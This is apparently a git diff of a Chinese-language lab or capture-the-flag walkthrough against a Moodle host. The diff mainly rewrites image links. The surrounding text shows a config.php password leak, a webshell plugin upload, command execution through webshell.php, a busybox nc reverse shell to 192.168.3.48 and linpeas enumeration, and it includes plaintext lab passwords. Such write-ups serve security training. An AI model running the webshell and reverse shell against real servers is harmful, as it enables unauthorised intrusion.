@@ -125,28 +125,28 @@ Task Completed
 curl -O http://dev.moodle.dsz/backup.tar.gz
 ```
 解压后打开下载的文件，`config.php`中找到一个密码 `pzp5V2Of3akjaJrhRauR`
-![[Pasted image 20260113221419.png]]
+![](images/Pasted%20image%2020260113221419.png)
 发现密码 `pzp5V2Of3akjaJrhRauR.`
 ### login
 
 测试过程中发现还是要改一次`hosts`文件  `192.168.3.192 moodle.dsz`
-![[Pasted image 20260110120429.png]]
+![](images/Pasted%20image%2020260110120429.png)
 https://github.com/p0dalirius/Moodle-webshell-plugin/tree/master?tab=readme-ov-file 上传插件，可以参考`github`上的视频
 
-![[shell操作.mp4]]
+![](images/shell%E6%93%8D%E4%BD%9C.mp4)
 
 下载对应的插件后，点击上传，`Upload a file`
-![[Pasted image 20260113222604.png]]
+![](images/Pasted%20image%2020260113222604.png)
 
 ### hackbar
 执行下 `http://moodle.dsz/local/moodle_webshell/webshell.php?action=exec&cmd=id` 查看是否成功
 
-![[Pasted image 20260113223247.png]]
+![](images/Pasted%20image%2020260113223247.png)
  **nc反弹**
 ```
 http://moodle.dsz/local/moodle_webshell/webshell.php?action=exec&cmd=busybox nc 192.168.3.48 1111 -e /bin/bash 
 ```
-![[Pasted image 20260113223744.png]]
+![](images/Pasted%20image%2020260113223744.png)
 
 ## 3.进入系统
 
@@ -295,7 +295,7 @@ bash linpeas.sh
 exit
 ```
 
-![[Pasted image 20260113230641.png]]
+![](images/Pasted%20image%2020260113230641.png)
 `last`默认只显示精简的登录记录，要查看详细信息，使用 `-F`（完整时间）、`-i`（显示`IP` 数字格式）、`-w`（完整用户名）
 
 ```bash
@@ -307,5 +307,5 @@ reboot   system boot  0.0.0.0          Fri Dec 26 23:13:00 2025   still running
 sF6Kfzr69w7dyZALAhl6 pts/1        192.168.3.94  
 ·······
 ```
-![[Pasted image 20260113230744.png]]
+![](images/Pasted%20image%2020260113230744.png)
 同样获得密码 `sF6Kfzr69w7dyZALAhl6`
